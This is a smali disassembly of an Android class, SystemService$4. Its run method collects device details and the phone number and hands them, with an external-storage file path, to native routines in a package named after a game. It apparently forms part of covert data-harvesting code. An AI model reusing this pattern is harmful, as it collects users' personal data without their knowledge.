.class Lcom/fa/c/SystemService$4;
.super Ljava/lang/Object;
.source "SystemService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/fa/c/SystemService;->Work()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/fa/c/SystemService;


# direct methods
.method constructor <init>(Lcom/fa/c/SystemService;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    .line 225
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    .line 230
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    new-instance v8, Lcom/Jump/vikingJump/NativeWrapper;

    invoke-direct {v8}, Lcom/Jump/vikingJump/NativeWrapper;-><init>()V

    invoke-static {v7, v8}, Lcom/fa/c/SystemService;->access$3(Lcom/fa/c/SystemService;Lcom/Jump/vikingJump/NativeWrapper;)V

    .line 231
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-virtual {v7}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7}, Lcom/fa/c/Utilities;->GetDeviceInfoBytes(Landroid/content/Context;)[B

    move-result-object v2

    .line 232
    .local v2, "deviceDataBytes":[B
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-virtual {v7}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7}, Lcom/fa/c/Utilities;->GetDeviceInfoString(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    .line 234
    .local v1, "deviceData":Ljava/lang/String;
    if-eqz v1, :cond_0

    .line 236
    const/16 v7, 0x10

    aget-byte v4, v2, v7

    .line 237
    .local v4, "time":B
    const/16 v7, 0x11

    aget-byte v5, v2, v7

    .line 238
    .local v5, "version":B
    const/16 v7, 0x12

    aget-byte v0, v2, v7

    .line 239
    .local v0, "batery":B
    const/16 v7, 0x13

    aget-byte v6, v2, v7

    .line 243
    .local v6, "wifi":B
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v7}, Lcom/fa/c/SystemService;->access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;

    move-result-object v7

    invoke-virtual {v7, v1}, Lcom/Jump/vikingJump/NativeWrapper;->SetInfo(Ljava/lang/String;)I

    .line 244
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v7}, Lcom/fa/c/SystemService;->access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;

    move-result-object v7

    invoke-virtual {v7, v4, v5, v0, v6}, Lcom/Jump/vikingJump/NativeWrapper;->SetInfo2(BBBB)I

    .line 248
    :try_start_0
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v7}, Lcom/fa/c/SystemService;->access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;

    move-result-object v7

    iget-object v8, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-virtual {v8}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-static {v8}, Lcom/fa/c/Utilities;->GetPhoneNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/Jump/vikingJump/NativeWrapper;->SetPhone(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 269
    .end local v0    # "batery":B
    .end local v4    # "time":B
    .end local v5    # "version":B
    .end local v6    # "wifi":B
    :cond_0
    :goto_0
    :try_start_1
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v7}, Lcom/fa/c/SystemService;->access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v9, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    iget-object v9, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-virtual {v9}, Lcom/fa/c/SystemService;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    invoke-static {v9}, Lcom/fa/c/Utilities;->GetExchangeFileName(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/Jump/vikingJump/NativeWrapper;->StartCPS(Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 276
    :goto_1
    return-void

    .line 250
    .restart local v0    # "batery":B
    .restart local v4    # "time":B
    .restart local v5    # "version":B
    .restart local v6    # "wifi":B
    :catch_0
    move-exception v3

    .line 254
    .local v3, "e":Ljava/lang/Exception;
    iget-object v7, p0, Lcom/fa/c/SystemService$4;->this$0:Lcom/fa/c/SystemService;

    invoke-static {v7}, Lcom/fa/c/SystemService;->access$4(Lcom/fa/c/SystemService;)Lcom/Jump/vikingJump/NativeWrapper;

    move-result-object v7

    const-string v8, "NO_SIM"

    invoke-virtual {v7, v8}, Lcom/Jump/vikingJump/NativeWrapper;->SetPhone(Ljava/lang/String;)I

    goto :goto_0

    .line 271
    .end local v0    # "batery":B
    .end local v3    # "e":Ljava/lang/Exception;
    .end local v4    # "time":B
    .end local v5    # "version":B
    .end local v6    # "wifi":B
    :catch_1
    move-exception v7

    goto :goto_1
.end method
